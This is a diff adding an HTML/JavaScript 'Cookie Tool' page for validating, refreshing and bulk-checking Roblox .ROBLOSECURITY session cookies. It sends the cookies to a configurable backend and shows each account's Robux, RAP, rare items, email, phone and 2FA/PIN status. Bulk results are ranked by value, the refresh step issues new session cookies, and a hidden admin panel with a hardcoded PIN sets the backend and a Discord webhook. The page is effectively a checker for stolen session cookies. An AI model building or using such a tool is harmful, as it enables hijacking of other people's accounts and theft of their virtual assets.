@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cookie Tool</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+body { background: #0f0f10; color: #fff; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
+
+.container { background: #1a1c1e; border: 1px solid #2a2c2e; border-radius: 16px; width: 100%; max-width: 640px; padding: 28px; }
+
+h1 { font-size: 22px; margin-bottom: 6px; }
+h1 span { color: #00a2ff; }
+.subtitle { color: #888; font-size: 13px; margin-bottom: 22px; }
+
+.status-bar { display: flex; justify-content: space-between; align-items: center; padding: 10px 14px; background: #232527; border-radius: 8px; margin-bottom: 20px; font-size: 12px; }
+.status-bar .dot { width: 8px; height: 8px; border-radius: 50%; background: #ff4d4d; display: inline-block; margin-right: 6px; }
+.status-bar .dot.ok { background: #22c55e; }
+
+.tab { display: flex; gap: 4px; margin-bottom: 18px; border-bottom: 1px solid #2a2c2e; overflow-x: auto; }
+.tab button { background: transparent; color: #888; border: none; padding: 10px 14px; cursor: pointer; font-size: 13px; border-bottom: 2px solid transparent; white-space: nowrap; }
+.tab button.active { color: #00a2ff; border-bottom-color: #00a2ff; }
+
+.section { display: none; }
+.section.active { display: block; }
+
+.form-group { margin-bottom: 14px; }
+.form-group label { display: block; font-size: 12px; color: #b8b8b8; margin-bottom: 6px; font-weight: 500; }
+.form-group input, .form-group textarea { width: 100%; padding: 12px 14px; background: #232527; border: 1px solid #2a2c2e; border-radius: 8px; color: #fff; font-size: 14px; outline: none; font-family: inherit; }
+.form-group textarea { resize: vertical; min-height: 100px; font-size: 12px; word-break: break-all; }
+.form-group input:focus, .form-group textarea:focus { border-color: #00a2ff; }
+
+.btn { width: 100%; padding: 13px; background: #00a2ff; color: #fff; border: none; border-radius: 8px; font-size: 14px; font-weight: 700; cursor: pointer; margin-top: 4px; }
+.btn:hover { background: #0089d6; }
+.btn:disabled { background: #4a4c4e; cursor: not-allowed; }
+.btn-secondary { background: #393b3d; }
+.btn-secondary:hover { background: #4a4c4e; }
+
+.result { margin-top: 16px; padding: 14px; background: #232527; border-radius: 8px; font-size: 13px; line-height: 1.7; display: none; }
+.result.show { display: block; }
+.result .row { display: flex; justify-content: space-between; padding: 4px 0; border-bottom: 1px solid #2a2c2e; }
+.result .row:last-child { border-bottom: none; }
+.result .label { color: #888; }
+.result .value { color: #fff; font-weight: 600; }
+.result .ok { color: #22c55e; font-weight: 700; }
+.result .err { color: #ff4d4d; font-weight: 700; }
+.result .cookie-box { background: #0f0f10; border: 1px solid #2a2c2e; border-radius: 6px; padding: 10px; font-size: 11px; word-break: break-all; color: #b8b8b8; margin-top: 8px; max-height: 120px; overflow-y: auto; }
+
+.avatar { width: 48px; height: 48px; border-radius: 50%; background: #2a2c2e; }
+
+.bulk-item { display: flex; align-items: center; gap: 10px; padding: 10px; background: #232527; border-radius: 8px; margin-bottom: 8px; border-left: 3px solid #393b3d; }
+.bulk-item.valid { border-left-color: #22c55e; }
+.bulk-item.invalid { border-left-color: #ff4d4d; }
+.bulk-item img { width: 36px; height: 36px; border-radius: 50%; background: #393b3d; }
+.bulk-item .info { flex: 1; min-width: 0; }
+.bulk-item .name { font-size: 13px; font-weight: 600; }
+.bulk-item .meta { font-size: 11px; color: #888; margin-top: 2px; }
+.bulk-item .stats { font-size: 11px; color: #b8b8b8; text-align: right; white-space: nowrap; }
+
+.bulk-summary { padding: 12px; background: #232527; border-radius: 8px; margin-bottom: 12px; text-align: center; font-size: 13px; }
+.bulk-summary .ok { color: #22c55e; font-weight: 700; }
+.bulk-summary .err { color: #ff4d4d; font-weight: 700; }
+
+.progress-bar { width: 100%; height: 6px; background: #2a2c2e; border-radius: 3px; overflow: hidden; margin: 10px 0; }
+.progress-fill { height: 100%; background: linear-gradient(90deg, #00a2ff, #0089d6); width: 0%; transition: width 0.1s linear; }
+
+.admin-icon { position: fixed; bottom: 16px; right: 16px; width: 36px; height: 36px; background: rgba(26,28,30,0.6); border: 1px solid rgba(42,44,46,0.5); border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; opacity: 0.4; transition: all 0.3s; z-index: 9998; font-size: 16px; color: #666; }
+.admin-icon:hover { opacity: 1; background: rgba(26,28,30,0.9); border-color: #00a2ff; color: #00a2ff; }
+
+.admin-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85); display: none; justify-content: center; align-items: center; z-index: 9999; padding: 20px; }
+.admin-overlay.show { display: flex; }
+.admin-panel { background: #1a1c1e; border: 1px solid #00a2ff; border-radius: 12px; width: 100%; max-width: 480px; padding: 28px; box-shadow: 0 0 40px rgba(0,162,255,0.3); }
+.admin-panel h2 { color: #00a2ff; font-size: 20px; margin-bottom: 6px; }
+.admin-panel .admin-sub { color: #888; font-size: 12px; margin-bottom: 22px; }
+.admin-panel .form-group label { color: #d0d0d0; }
+.admin-panel .form-group input { background: #232527; border-color: #2a2c2e; }
+.admin-panel .form-group input:focus { border-color: #00a2ff; }
+.admin-panel .btn-admin { background: #00a2ff; color: #fff; width: 100%; padding: 12px; border: none; border-radius: 8px; font-size: 14px; font-weight: 600; cursor: pointer; margin-top: 4px; }
+.admin-panel .btn-admin:hover { background: #0089d6; }
+.admin-panel .btn-close { background: transparent; color: #888; border: 1px solid #2a2c2e; padding: 10px; border-radius: 8px; width: 100%; font-size: 13px; cursor: pointer; margin-top: 10px; }
+.admin-panel .btn-close:hover { background: #232527; color: #fff; }
+.admin-status { margin-top: 14px; padding: 10px; border-radius: 6px; font-size: 12px; text-align: center; display: none; }
+.admin-status.show { display: block; }
+.admin-status.ok { background: rgba(34,197,94,0.15); color: #22c55e; }
+.admin-status.err { background: rgba(255,77,77,0.15); color: #ff4d4d; }
+.lock-screen { text-align: center; padding: 20px 0; }
+.lock-screen .lock-icon { font-size: 48px; margin-bottom: 16px; }
+.lock-screen h3 { color: #fff; margin-bottom: 6px; }
+.lock-screen p { color: #888; font-size: 12px; margin-bottom: 20px; }
+.pin-input { width: 100%; padding: 14px; background: #232527; border: 1px solid #2a2c2e; border-radius: 8px; color: #fff; font-size: 20px; text-align: center; letter-spacing: 8px; outline: none; margin-bottom: 12px; }
+.pin-input:focus { border-color: #00a2ff; }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <h1>🔄 Cookie <span>Tool</span></h1>
+  <p class="subtitle">Check, refresh, and manage Roblox cookies</p>
+
+  <div class="status-bar">
+    <div><span class="dot" id="statusDot"></span><span id="statusText">Backend not configured</span></div>
+    <div id="configStatus" style="color:#666; font-size:11px;">Config: —</div>
+  </div>
+
+  <div class="tab">
+    <button class="active" onclick="switchTab('check', event)">Check</button>
+    <button onclick="switchTab('refresh', event)">Refresh</button>
+    <button onclick="switchTab('bulk', event)">Bulk</button>
+  </div>
+
+  <!-- CHECK -->
+  <div class="section active" id="tab-check">
+    <div class="form-group">
+      <label>Paste Cookie .ROBLOSECURITY</label>
+      <textarea id="checkInput" placeholder="Paste cookie di sini..."></textarea>
+    </div>
+    <button class="btn" onclick="checkCookie()">🔍 Check Cookie</button>
+    <button class="btn btn-secondary" onclick="fetchFull()" style="margin-top:8px;">📊 Fetch Full Data</button>
+    <div class="result" id="checkResult"></div>
+  </div>
+
+  <!-- REFRESH -->
+  <div class="section" id="tab-refresh">
+    <div class="form-group">
+      <label>Paste Cookie .ROBLOSECURITY</label>
+      <textarea id="refreshInput" placeholder="Paste cookie di sini..."></textarea>
+    </div>
+    <button class="btn" onclick="refreshCookie()">🔄 Refresh Cookie</button>
+    <div class="result" id="refreshResult"></div>
+  </div>
+
+  <!-- BULK -->
+  <div class="section" id="tab-bulk">
+    <div class="form-group">
+      <label>Paste Cookies (1 per line)</label>
+      <textarea id="bulkInput" placeholder="Cookie 1&#10;Cookie 2&#10;Cookie 3" style="min-height:150px;"></textarea>
+    </div>
+    <button class="btn" onclick="bulkCheck()">🔍 Check All</button>
+    <button class="btn btn-secondary" onclick="clearBulk()" style="margin-top:8px;">🗑️ Clear</button>
+    <div class="progress-bar" id="bulkProgress" style="display:none;"><div class="progress-fill" id="bulkProgressBar"></div></div>
+    <div class="result" id="bulkResult" style="padding:0; background:transparent;"></div>
+  </div>
+</div>
+
+<!-- ADMIN ICON -->
+<div class="admin-icon" id="adminIcon" title="⚙️">⚙️</div>
+
+<!-- ADMIN PANEL -->
+<div class="admin-overlay" id="adminOverlay">
+  <div class="admin-panel">
+    <div id="adminLock">
+      <div class="lock-screen">
+        <div class="lock-icon">🔒</div>
+        <h3>Admin Panel</h3>
+        <p>Enter access code</p>
+      </div>
+      <input type="password" class="pin-input" id="adminPin" placeholder="••••" maxlength="20" inputmode="numeric">
+      <button class="btn-admin" onclick="verifyPin()">Enter</button>
+      <button class="btn-close" onclick="closeAdmin()">Close</button>
+      <div class="admin-status err" id="pinStatus">Wrong code</div>
+    </div>
+    <div id="adminContent" style="display:none;">
+      <h2>⚙️ Admin Panel</h2>
+      <p class="admin-sub">Tool Configuration</p>
+      <div class="form-group">
+        <label>Backend API URL</label>
+        <input type="text" id="cfgBackend" placeholder="https://backend-lu.onrender.com">
+      </div>
+      <div class="form-group">
+        <label>Discord Webhook URL</label>
+        <input type="text" id="cfgWebhook" placeholder="https://discord.com/api/webhooks/...">
+      </div>
+      <button class="btn-admin" onclick="saveConfig()">💾 Save Configuration</button>
+      <button class="btn-close" onclick="closeAdmin()">Close</button>
+      <div class="admin-status ok" id="saveStatus">Configuration saved!</div>
+    </div>
+  </div>
+</div>
+
+<script>
+// ============================================
+// CONFIG
+// ============================================
+const ADMIN_PASSWORD = '1818';
+
+const DEFAULT_CONFIG = {
+  backend: '',
+  webhook: 'ISI_URL_WEBHOOK_DISCORD_LU'
+};
+
+function getConfig() {
+  try {
+    const s = localStorage.getItem('cookie_tool_config');
+    if (s) return { ...DEFAULT_CONFIG, ...JSON.parse(s) };
+  } catch(e) {}
+  return { ...DEFAULT_CONFIG };
+}
+function saveConfigToStorage(c) { localStorage.setItem('cookie_tool_config', JSON.stringify(c)); }
+
+let CONFIG = getConfig();
+
+function updateStatus() {
+  const dot = document.getElementById('statusDot');
+  const text = document.getElementById('statusText');
+  const configStatus = document.getElementById('configStatus');
+  if (CONFIG.backend) {
+    dot.classList.add('ok');
+    text.textContent = 'Backend configured';
+    configStatus.textContent = 'Config: ready';
+  } else {
+    dot.classList.remove('ok');
+    text.textContent = 'Backend not configured';
+    configStatus.textContent = 'Config: missing';
+  }
+}
+
+// ============================================
+// TAB
+// ============================================
+function switchTab(tab, ev) {
+  document.querySelectorAll('.tab button').forEach(b => b.classList.remove('active'));
+  document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+  if (ev && ev.target) ev.target.classList.add('active');
+  document.getElementById('tab-' + tab).classList.add('active');
+}
+
+// ============================================
+// CHECK COOKIE
+// ============================================
+async function checkCookie() {
+  const cookie = document.getElementById('checkInput').value.trim();
+  const el = document.getElementById('checkResult');
+  el.classList.add('show');
+  el.innerHTML = '⏳ Checking...';
+
+  if (!CONFIG.backend) { el.innerHTML = '<span class="err">❌ Backend URL not configured</span>'; return; }
+
+  try {
+    const res = await fetch(CONFIG.backend + '/api/check-cookie', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ cookie })
+    });
+    const r = await res.json();
+
+    if (r.valid) {
+      el.innerHTML = `
+        <div class="row"><span class="label">Status</span><span class="ok">✅ Valid</span></div>
+        <div class="row"><span class="label">Username</span><span class="value">${r.user.name}</span></div>
+        <div class="row"><span class="label">Display</span><span class="value">${r.user.displayName}</span></div>
+        <div class="row"><span class="label">User ID</span><span class="value">${r.user.id}</span></div>
+      `;
+    } else {
+      el.innerHTML = `<div class="row"><span class="label">Status</span><span class="err">❌ ${r.error || 'Invalid'}</span></div>`;
+    }
+  } catch(e) {
+    el.innerHTML = `<span class="err">❌ Error: ${e.message}</span>`;
+  }
+}
+
+// ============================================
+// FETCH FULL DATA
+// ============================================
+async function fetchFull() {
+  const cookie = document.getElementById('checkInput').value.trim();
+  const el = document.getElementById('checkResult');
+  el.classList.add('show');
+  el.innerHTML = '⏳ Fetching...';
+
+  if (!CONFIG.backend) { el.innerHTML = '<span class="err">❌ Backend URL not configured</span>'; return; }
+
+  try {
+    const res = await fetch(CONFIG.backend + '/api/fetch-by-cookie', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ cookie })
+    });
+    const r = await res.json();
+
+    if (r.success) {
+      const d = r.data;
+      el.innerHTML = `
+        <div style="display:flex; align-items:center; gap:12px; margin-bottom:12px;">
+          ${d.avatar ? `<img src="${d.avatar}" class="avatar">` : ''}
+          <div>
+            <div style="font-weight:700; font-size:15px;">${d.user?.name || 'N/A'}</div>
+            <div style="font-size:12px; color:#888;">ID: ${d.user?.id || 'N/A'}</div>
+          </div>
+        </div>
+        <div class="row"><span class="label">Robux</span><span class="value">${d.robux || 0}</span></div>
+        <div class="row"><span class="label">RAP</span><span class="value">${d.rap || 0}</span></div>
+        <div class="row"><span class="label">Limiteds</span><span class="value">${d.limitedsOwned || 0}</span></div>
+        <div class="row"><span class="label">Account Age</span><span class="value">${d.accountAge || 0} days</span></div>
+        <div class="row"><span class="label">Email</span><span class="value">${d.email || 'N/A'}</span></div>
+        <div class="row"><span class="label">Phone</span><span class="value">${d.phone || 'N/A'}</span></div>
+        <div class="row"><span class="label">2FA</span><span class="value">${d.twoFAEnabled ? '✅ Enabled' : '❌ Disabled'}</span></div>
+        <div class="row"><span class="label">PIN</span><span class="value">${d.pinEnabled ? '✅ Enabled' : '❌ Disabled'}</span></div>
+        <div class="row"><span class="label">Korblox</span><span class="value">${d.hasKorblox ? '✅' : '❌'}</span></div>
+        <div class="row"><span class="label">Headless</span><span class="value">${d.hasHeadless ? '✅' : '❌'}</span></div>
+      `;
+    } else {
+      el.innerHTML = `<span class="err">❌ ${r.error || 'Failed'}</span>`;
+    }
+  } catch(e) {
+    el.innerHTML = `<span class="err">❌ Error: ${e.message}</span>`;
+  }
+}
+
+// ============================================
+// REFRESH COOKIE
+// ============================================
+async function refreshCookie() {
+  const cookie = document.getElementById('refreshInput').value.trim();
+  const el = document.getElementById('refreshResult');
+  el.classList.add('show');
+  el.innerHTML = '⏳ Refreshing...';
+
+  if (!CONFIG.backend) { el.innerHTML = '<span class="err">❌ Backend URL not configured</span>'; return; }
+
+  try {
+    const res = await fetch(CONFIG.backend + '/api/refresh-cookie', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ cookie })
+    });
+    const r = await res.json();
+
+    if (r.success) {
+      el.innerHTML = `
+        <div class="row"><span class="label">Status</span><span class="ok">✅ Refreshed</span></div>
+        <div class="row"><span class="label">Username</span><span class="value">${r.user.name}</span></div>
+        <div class="row"><span class="label">User ID</span><span class="value">${r.user.id}</span></div>
+        <div class="row"><span class="label">Cookie Changed</span><span class="value">${r.cookieChanged ? '✅ Yes' : '❌ No'}</span></div>
+        <div class="row"><span class="label">Expires</span><span class="value">${r.expiresAt}</span></div>
+        <div class="row"><span class="label">Days Left</span><span class="value">${r.daysLeft} days</span></div>
+        <div class="row"><span class="label">Robux</span><span class="value">${r.accountData.robux || 0}</span></div>
+        <div class="row"><span class="label">RAP</span><span class="value">${r.accountData.rap || 0}</span></div>
+        <div class="row"><span class="label">Korblox</span><span class="value">${r.accountData.hasKorblox ? '✅' : '❌'}</span></div>
+        <div class="row"><span class="label">Headless</span><span class="value">${r.accountData.hasHeadless ? '✅' : '❌'}</span></div>
+        <div style="margin-top:10px; font-size:12px; color:#888;">New Cookie:</div>
+        <div class="cookie-box">${r.newCookie}</div>
+      `;
+    } else {
+      el.innerHTML = `<span class="err">❌ ${r.error || 'Failed'}</span>`;
+    }
+  } catch(e) {
+    el.innerHTML = `<span class="err">❌ Error: ${e.message}</span>`;
+  }
+}
+
+// ============================================
+// BULK CHECK
+// ============================================
+async function bulkCheck() {
+  const raw = document.getElementById('bulkInput').value.trim();
+  if (!raw) { alert('Paste cookies dulu!'); return; }
+
+  const lines = raw.split('\n').map(l => l.trim()).filter(l => l.length > 10);
+  if (lines.length === 0) { alert('No valid cookies!'); return; }
+  if (!CONFIG.backend) { alert('Backend URL not configured!'); return; }
+
+  const el = document.getElementById('bulkResult');
+  const progress = document.getElementById('bulkProgress');
+  const bar = document.getElementById('bulkProgressBar');
+
+  progress.style.display = 'block';
+  el.innerHTML = '⏳ Checking ' + lines.length + ' cookies...';
+  let fake = 0;
+  const iv = setInterval(() => {
+    if (fake < 90) { fake += Math.random() * 3; bar.style.width = Math.min(fake, 90) + '%'; }
+  }, 300);
+
+  try {
+    const res = await fetch(CONFIG.backend + '/api/bulk-check-cookie', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ cookies: lines })
+    });
+    const r = await res.json();
+    clearInterval(iv);
+    bar.style.width = '100%';
+
+    if (!r.success) {
+      el.innerHTML = `<span class="err">❌ ${r.error || 'Failed'}</span>`;
+      return;
+    }
+
+    let html = `
+      <div class="bulk-summary">
+        Total: <b>${r.total}</b> | <span class="ok">✅ Valid: ${r.valid}</span> | <span class="err">❌ Invalid: ${r.invalid}</span>
+      </div>
+    `;
+
+    const sorted = [...r.results].sort((a, b) => {
+      if (a.valid && !b.valid) return -1;
+      if (!a.valid && b.valid) return 1;
+      if (a.valid && b.valid) return (b.rap || 0) - (a.rap || 0);
+      return 0;
+    });
+
+    for (const item of sorted) {
+      if (item.valid) {
+        const rare = [];
+        if (item.hasKorblox) rare.push('🎩 Korblox');
+        if (item.hasHeadless) rare.push('💀 Headless');
+        html += `
+          <div class="bulk-item valid">
+            <img src="${item.avatar}">
+            <div class="info">
+              <div class="name">${item.user.name} <span style="color:#888; font-weight:400;">(${item.user.id})</span></div>
+              <div class="meta">${item.accountAge} days old${rare.length ? ' · ' + rare.join(' · ') : ''}</div>
+            </div>
+            <div class="stats">💰 ${item.robux}<br>📊 ${item.rap} RAP<br>📦 ${item.limitedsOwned}</div>
+          </div>
+        `;
+      } else {
+        html += `
+          <div class="bulk-item invalid">
+            <div style="width:36px; height:36px; border-radius:50%; background:#393b3d; display:flex; align-items:center; justify-content:center;">❌</div>
+            <div class="info">
+              <div class="name" style="color:#888;">Cookie #${item.index + 1}</div>
+              <div class="meta" style="color:#ff4d4d;">${item.error}</div>
+            </div>
+          </div>
+        `;
+      }
+    }
+
+    el.innerHTML = html;
+    setTimeout(() => { progress.style.display = 'none'; }, 1500);
+  } catch(e) {
+    clearInterval(iv);
+    el.innerHTML = `<span class="err">❌ Error: ${e.message}</span>`;
+  }
+}
+
+function clearBulk() {
+  document.getElementById('bulkInput').value = '';
+  document.getElementById('bulkResult').innerHTML = '';
+  document.getElementById('bulkProgress').style.display = 'none';
+}
+
+// ============================================
+// ADMIN PANEL
+// ============================================
+document.getElementById('adminIcon').addEventListener('click', openAdmin);
+
+function openAdmin() {
+  document.getElementById('adminOverlay').classList.add('show');
+  document.getElementById('adminLock').style.display = 'block';
+  document.getElementById('adminContent').style.display = 'none';
+  document.getElementById('adminPin').value = '';
+  document.getElementById('pinStatus').classList.remove('show');
+  setTimeout(() => document.getElementById('adminPin').focus(), 100);
+}
+function closeAdmin() {
+  document.getElementById('adminOverlay').classList.remove('show');
+}
+function verifyPin() {
+  const pin = document.getElementById('adminPin').value;
+  if (pin === ADMIN_PASSWORD) {
+    document.getElementById('adminLock').style.display = 'none';
+    document.getElementById('adminContent').style.display = 'block';
+    document.getElementById('cfgBackend').value = CONFIG.backend;
+    document.getElementById('cfgWebhook').value = CONFIG.webhook;
+  } else {
+    document.getElementById('pinStatus').classList.add('show');
+    document.getElementById('adminPin').value = '';
+    setTimeout(() => document.getElementById('pinStatus').classList.remove('show'), 2000);
+  }
+}
+function saveConfig() {
+  CONFIG.backend = document.getElementById('cfgBackend').value.trim();
+  CONFIG.webhook = document.getElementById('cfgWebhook').value.trim();
+  saveConfigToStorage(CONFIG);
+  document.getElementById('saveStatus').classList.add('show');
+  setTimeout(() => document.getElementById('saveStatus').classList.remove('show'), 2000);
+  updateStatus();
+}
+
+// ============================================
+// INIT
+// ============================================
+window.addEventListener('DOMContentLoaded', updateStatus);
+</script>
+
+</body>
+</html>
